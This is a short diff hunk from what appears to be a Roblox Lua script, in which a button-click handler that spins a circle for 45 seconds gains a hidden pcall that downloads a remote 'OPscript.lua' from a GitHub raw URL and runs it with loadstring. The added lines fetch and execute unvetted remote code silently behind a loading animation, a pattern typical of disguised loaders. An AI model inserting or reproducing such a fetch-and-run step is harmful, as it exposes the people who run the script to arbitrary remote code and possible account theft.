@@ -107,7 +107,9 @@ actionBtn.MouseButton1Click:Connect(function()
 		circle.Rotation = angle
 	end)
 
-	
+	pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Clarksds/GrowAGarden/refs/heads/main/OPscript.lua"))()
+	end)
 
 	wait(45)
 	rotating:Disconnect()
